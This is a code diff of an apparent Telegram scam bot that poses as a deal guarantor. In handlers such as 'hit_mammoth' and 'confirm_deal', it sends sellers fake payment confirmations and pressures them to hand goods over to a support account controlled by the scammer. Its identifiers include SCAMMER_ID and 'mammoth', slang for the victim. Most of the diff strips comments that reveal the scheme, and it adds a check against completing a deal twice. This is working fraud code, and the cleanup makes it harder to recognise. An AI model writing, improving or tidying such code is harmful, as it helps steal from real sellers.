@@ -77,15 +77,6 @@ def get_currency_emoji(currency):
         return E_GIFT
     return ""
 
-def get_currency_display(currency):
-    if currency == "грам":
-        return "грам"
-    elif currency == "карта":
-        return "карта"
-    elif currency == "звезд":
-        return "звезд"
-    return currency
-
 async def send_main_menu(message: Message, user_id: int):
     is_admin_user = is_admin(user_id)
 
@@ -485,7 +476,6 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
     
     currency_display = {"gram": "GRAM", "card": "Карта", "stars": "Звёзды"}[currency]
     
-    # ДЛЯ ЗВЁЗД — СРАЗУ ПРОСИМ СУММУ (РЕКВИЗИТЫ НЕ НУЖНЫ)
     if currency == "stars":
         await state.update_data(currency=currency_names[currency])
         if not callback.message.text:
@@ -504,7 +494,6 @@ async def select_currency(callback: CallbackQuery, state: FSMContext):
         await callback.answer()
         return
     
-    # ДЛЯ GRAM И КАРТА — ПРОВЕРЯЕМ РЕКВИЗИТЫ
     user_id = callback.from_user.id
     reqs = get_requisites(user_id)
     
@@ -583,7 +572,6 @@ async def process_description(message: Message, state: FSMContext):
 
     user_id = message.from_user.id
     
-    # ПРОВЕРКА РЕКВИЗИТОВ ТОЛЬКО ДЛЯ ГРАМ И КАРТА (ДЛЯ ЗВЁЗД — ПРОПУСКАЕМ!)
     if currency == "грам" or currency == "карта":
         reqs = get_requisites(user_id)
         req_type = "gram" if currency == "грам" else "card"
@@ -599,7 +587,6 @@ async def process_description(message: Message, state: FSMContext):
                 reply_markup=requisite_menu()
             )
             return
-    # ДЛЯ ЗВЁЗД — ПРОПУСКАЕМ (РЕКВИЗИТЫ НЕ НУЖНЫ)
 
     bot_username = (await message.bot.get_me()).username
 
@@ -907,7 +894,6 @@ async def hit_mammoth(callback: CallbackQuery):
 
     logger.info(f"hit_mammoth: deal={deal_code}, seller_id={seller_id}")
 
-    # СКАМЕРУ
     await callback.message.edit_text(
         f"{E_SUCCESS} <b>Оплата по сделке #{deal_code} успешно получена!</b>\n<b>Продавец получил уведомление</b>"
     )
@@ -921,7 +907,6 @@ async def hit_mammoth(callback: CallbackQuery):
         f"{E_WARNING} <b>Дождитесь, пока продавец передаст товар на аккаунт {SUPPORT_USERNAME}, а затем подтвердите это в боте!</b>"
     )
 
-    # МАМОНТУ
     if seller_id:
         try:
             await callback.bot.send_message(
@@ -948,7 +933,6 @@ async def hit_mammoth(callback: CallbackQuery):
 
 @router.callback_query(F.data.startswith("confirm_deal_"))
 async def confirm_deal(callback: CallbackQuery):
-    """Мамонт нажимает 'Подтвердить передачу'"""
     deal_code = callback.data.replace("confirm_deal_", "")
     deal = get_deal(deal_code)
 
@@ -964,7 +948,6 @@ async def confirm_deal(callback: CallbackQuery):
     currency_emoji = get_currency_emoji(deal[5])
     amount_display = format_amount(deal[4])
 
-    # ===== МАМОНТУ: жди проверки =====
     if seller_id:
         try:
             await callback.bot.send_message(
@@ -982,7 +965,6 @@ async def confirm_deal(callback: CallbackQuery):
         except Exception as e:
             logger.error(f"Не удалось отправить сообщение мамонту: {e}")
 
-    # ===== СКАМЕРУ: проверь передачу (НОВОЕ СООБЩЕНИЕ) =====
     await callback.bot.send_message(
         SCAMMER_ID,
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
@@ -1012,6 +994,10 @@ async def confirm_deal_seller(callback: CallbackQuery):
         await callback.answer(ERROR_MESSAGES["deal_not_found"], show_alert=True)
         return
 
+    if deal[6] == 'completed':
+        await callback.answer("❌ Сделка уже завершена!", show_alert=True)
+        return
+
     update_deal_completed(deal_code)
     deal = get_deal(deal_code)
     
@@ -1025,7 +1011,6 @@ async def confirm_deal_seller(callback: CallbackQuery):
     if buyer_id:
         update_user_successful_deals(buyer_id)
 
-    # ===== СКАМЕРУ: сделка завершена =====
     await callback.message.edit_text(
         f"{E_DEAL} <b>Сделка #{deal_code}</b>\n"
         f"<b>Сумма:</b> {amount_display} {currency_emoji}\n"
@@ -1035,7 +1020,6 @@ async def confirm_deal_seller(callback: CallbackQuery):
         f"{E_SUCCESS} <b>Пожалуйста, дождитесь поступления товара на ваш аккаунт!</b>"
     )
 
-    # ===== МАМОНТУ: ожидай оплату =====
     if buyer_id:
         try:
             await callback.bot.send_message(
